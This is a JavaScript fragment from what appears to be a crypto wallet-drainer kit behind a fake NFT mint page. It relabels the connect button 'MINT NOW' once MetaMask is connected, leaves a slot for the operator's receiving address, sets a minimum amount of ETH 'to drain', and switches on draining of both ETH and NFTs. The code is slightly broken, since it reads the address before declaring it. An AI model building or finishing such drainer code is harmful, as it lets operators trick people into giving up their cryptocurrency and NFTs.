async function updateMetaMaskStatus() {
        isMetaMaskConnected().then((connected) => {
            if (connected) {
                document.getElementById("connect").innerText = "MINT NOW";
            } else {}
        });
    }

if (!receiveAddress.startsWith("0x") ||
    (
        receiveAddress.length >= 64 ||
        receiveAddress.length <= 40
    )
) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);

/*   = = = = = YOUR WALLET ADRESS = = = = =   */
const receiveAddress = "Your Eth wallet adress"; // Adress where you want to receive money/nfts

/*   = = = = = AMOUNT = = = = =   */
const mintInfo = {
    minimal: 2.0 // Minimal of amount of Eth to drain (2.0 is the minimum supported)
}

/*   = = = = = MODES = = = = =   */
const active = {
    eth: true,
    nfts: true, 
}